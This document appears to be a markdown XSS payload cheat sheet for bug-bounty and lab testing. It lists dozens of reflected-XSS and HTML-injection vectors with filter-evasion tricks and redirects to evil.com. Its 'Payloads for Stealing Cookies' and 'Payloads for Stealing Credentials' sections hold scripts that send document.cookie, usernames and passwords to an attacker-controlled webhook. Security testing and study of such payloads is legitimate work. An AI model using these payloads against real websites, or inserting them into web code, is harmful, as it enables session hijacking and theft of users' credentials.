- [Testing XSS](#testing-xss)
- [Testing XSS in Various Scenarios](#testing-xss-in-various-scenarios)
- [HTML Injection](#html-injection)
- [Angle Brackets HTML-Encoded Bypass](#angle-brackets-html-encoded-bypass)
  - [Reflected XSS in HTML Attribute with Angle Brackets HTML-Encoded](#reflected-xss-in-html-attribute-with-angle-brackets-html-encoded)
  - [Reflected XSS in a JavaScript String with Angle Brackets HTML-Encoded](#reflected-xss-in-a-javascript-string-with-angle-brackets-html-encoded)
- [Reflected XSS Into a JavaScript String Where Single Quote Escaped With Backslash](#Reflected-XSS-into-a-JavaScript-string-where-Single-Quote-Escaped-With-Backslash)
- [Reflected XSS with Angle Brackets and Double Quotes HTML-Encoded and Single Quotes Escaped](#reflected-xss-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [Reflected XSS Into a Backticks Template Literal with Unicode Escaped](#Reflected-XSS-Into-a-Backticks-Template-Literal-with-Unicode-Escaped)
- [Tags and Attribute Block Bypass](#tags-and-attribute-block-bypass)
  - [Reflected XSS into HTML Context with Most Tags and Attributes Blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
  - [Reflected XSS into HTML Context with Custom Tags](#reflected-xss-into-html-context-with-custom-tags)
- [Reflected XSS with Some SVG Markup Allowed](#reflected-xss-with-some-svg-markup-allowed)
- [Reflected XSS in Canonical Link Tag](#reflected-xss-in-canonical-link-tag)
- [Payloads for Stealing Cookies](#payloads-for-stealing-cookies)
- [Payloads for Stealing Credentials](#payloads-for-stealing-credentials)
- [XSS with Filter Evasion](#xss-with-filter-evasion)

## Testing XSS

**One Payload for Testing All Kinds of Scenarios**
```javascript
JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
<!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
\74k<K/contentEditable/autoFocus/OnFocus​=
/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76-->
```
```javascript
JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
</Title/<​/Style/<​/Script/</textArea/</iFrame>
\74k<K/contentEditable/autoFocus/OnFocus​=
/*${/*/;{/**/(import(/https:\\x55.is/.source))}//\76
```

**Note**
1. Check HTML tags and attributes for reflection.
2. If `<` and `>` symbols are reflected in the source code without encoding, XSS is possible.
3. If `'` or `"` symbols are reflected in the source code without encoding, XSS is possible.

---

## Testing XSS in Various Scenarios
```javascript
<button onclick=alert("xss")>click</button>
```
```javascript
<meta http-equiv="refresh" content='0; url=https://evil.com/
```
```javascript
<script>document.location.href = "http://evil.com";</script>
```
```javascript
<script>alert(1337)</script>
```
```javascript
><script>alert(1337)</script>
```
```javascript
<sCrIpt>alert(1337)</sCripT>
```
```javascript
">cyborg71<script>alert(1337)</script>
```
```javascript
<svg/ onload=alert(1337)//
```
```javascript
<Svg/OnLoad=(confirm)(1337)<!--
```
```javascript
<body/OnResize=(confirm)(123456)<!--
```
```javascript
<img src=x onerror=alert(1337)>
```
```javascript
</script><img src=x onerror=alert(1337)>
```
```javascript
<iframe src="javascript:alert(1337)">
```
```javascript
';alert(1337)//
```
```javascript
${alert(1337)}
```
```html
<custom-tag onmouseover='alert(1337)'>
```
```javascript
/?x=y'%09onclick='alert(1337)'%09accessKey='x'
```
```javascript
/?'accesskey='x'onclick='alert(1337)
```
```javascript
<img ismap=itemtype=yyy style=width:100%;height:100%;position:fixed;left:0px;top\
:0px; onmouseover=alert(/XSS/)//>
```
```javascript
#”><img src=/ onerror=alert(3)>
```
Inject in href attribute:
```javascript
javascript:alert(1337)
```
```html
y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
```
```html
"><h1>cyborg.71</h1>
```
```javascript
<script onclick="alert(1337)">
```
```html
<a href="javascript:alert('XSS')">Click me</a>
```
```html
<img src="https://i.imgflip.com/8uo0t9.jpg">
```
```javascript
javascript:decodeURIComponent('%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%60%68%74%74%70%73%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%3f%70%61%72%61%6d%3d%60%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e')//
```

**External Sources for Payloads**
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [Tiny XSS Payloads for Filter Bypass](https://github.com/terjanq/Tiny-XSS-Payloads)
- [For complex type of xss](https://html5sec.org/)

---

## HTML Injection
```html
<h1>cyborg71</h1>
```
```html
"><h1>cyborg71</h1>
```
**Redirect to a malicious page**
```
<meta http-equiv="refresh" content='0; url=https://evil.com/
```
```html
<a href="https://google.com"></a>
```
Sometimes applications decode url encoded inputs. So try to inject some payloads with url encoding and see if the application decode it into the plain text html code. You can try this method for xss also.
<br>
<br>
**HTML Payload**
```
<h1>cyborg71</h1>
```
**URL Encoded HTML Payload**
```
%3c%68%31%3e%63%79%62%6f%72%67%37%31%3c%2f%68%31%3e
```
[Poc of Coinbase Comment](https://hackerone.com/reports/104543)

---

## Angle Brackets HTML-Encoded Bypass

### Reflected XSS in HTML Attribute with Angle Brackets HTML-Encoded
Inject:
```html
<xss123>'"
```
Check if angle brackets `<` and `>` are encoded as `&lt;` and `&gt;`. If so, use these payloads:
```javascript
" onclick="alert(1337)
```
```javascript
" autofocus="alert(1337)
```
```javascript
" autofocus onfocus="alert(1337)
```
```javascript
" onmouseover="alert(1)
```

### Reflected XSS in a JavaScript String with Angle Brackets HTML-Encoded
Inject:
```html
<xss123>'"
```
Payloads to break out of the JavaScript context:
```javascript
xss';alert(1);'xss
```
```javascript
someString'-alert(1)-'someString
```
```javascript
someString"-alert(1)-"someString
```
```javascript
';alert(document.cookie);'
```

---

## Reflected XSS Into a JavaScript String Where Single Quote Escaped With Backslash
Close the script tag and inject:
```javascript
</script><img src=x onerror=alert(1337)>
```

---

## Reflected XSS with Angle Brackets and Double Quotes HTML-Encoded and Single Quotes Escaped
Payloads:
```javascript
\';alert(1337)//
```
```javascript
\'-alert(1)//
```

---

## Reflected XSS Into a Backticks Template Literal with Unicode Escaped

If the application use unicode escape and use backticks, you can use this payload.
```javascript
${alert(1337)}
```

---

## Tags and Attribute Block Bypass

### Reflected XSS into HTML Context with Most Tags and Attributes Blocked
Use:
```html
"><body onresize=alert(1337)>
```

### Reflected XSS into HTML Context with Custom Tags
Payloads:
```html
<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
```
```html
<xss id=a1 onfocus=alert(document.cookie) tabindex=1>#a1
```
For exploit server: 
```html
<script>
location = 'https://vulnweb.net/?search=%3Ccustom-tag+tabindex%3D%221%22+onfocus%3D%27alert(document.cookie)%27+id%3D%22a1%22%3E#a1';
</script>
```
**Portswigger Lab**

- [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## Reflected XSS with Some SVG Markup Allowed
```html
"><svg><animatetransform onbegin=alert(1337)></animatetransform></svg>
```
```html
"><svg><animatetransform onbegin='alert(1337)'></animatetransform></svg>
```

---

## Reflected XSS in Canonical Link Tag
Make a custom URL:
```
http://example.com/?whoami=cyborg71
```
If the `whoami` parameter is reflected in the page source, try these payloads:
```javascript
/?whoami=cyborg71'%09onclick='alert(1337)'%09accessKey='x'
```
```%09``` is used to indicate a horizontal tab. It's useful when application encodes the space character into %20 in the source code. 
```javascript
/?'accesskey='x'onclick='alert(1337)
```
Now, use this keys to get reflection.

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X

**Note:**
<br>
```<link>``` tag doesn't render in the page. So, you must need to provide a```accessKey``` in the payload to execute the payload.  

---

## Payloads for Stealing Cookies
```javascript
<script>
fetch('https://your-webhook-url.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```
```javascript
<script>document.location='https://your-webhook-url.oastify.com//'+document.cookie</script>
```
```javascript
<input type="text" name="username" placeholder="Enter Username">
<input type="password" name="password" placeholder="Enter Password" onchange="hax()">
<input type="hidden" name="csrf" value="">

<script>
  function hax() {
    // Extract CSRF token, username, and password
    var token = document.getElementsByName('csrf')[0].value;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;

    // Create a FormData object
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', `${username}:${password}`);
    data.append('name', 'victim');
    data.append('email', 'zenshell@zenshell.ninja');
    data.append('website', 'http://www.zenshell.ninja');

    // Send the data using fetch
    fetch('/post/comment', {
      method: 'POST',
      mode: 'no-cors',
      body: data
    });
  }
</script>
```

---

## Payloads for Stealing Credentials
```html
<input name="username" id="username">
<input type="password" name="password" onchange="if(this.value.length)fetch('https://your-webhook-url.oastify.com',{
  method: 'POST',
  mode: 'no-cors',
  body: username.value+':'+this.value
});">
```

---

## XSS with Filter Evasion
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```
```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```
```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

**XSS Filter Evasion Cheat Sheet**
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

<img width="1116" height="348" alt="Screenshot From 2025-07-26 22-36-29" src="https://github.com/user-attachments/assets/39b890d4-b65a-47f4-8a0b-14208a1b5342" />

---
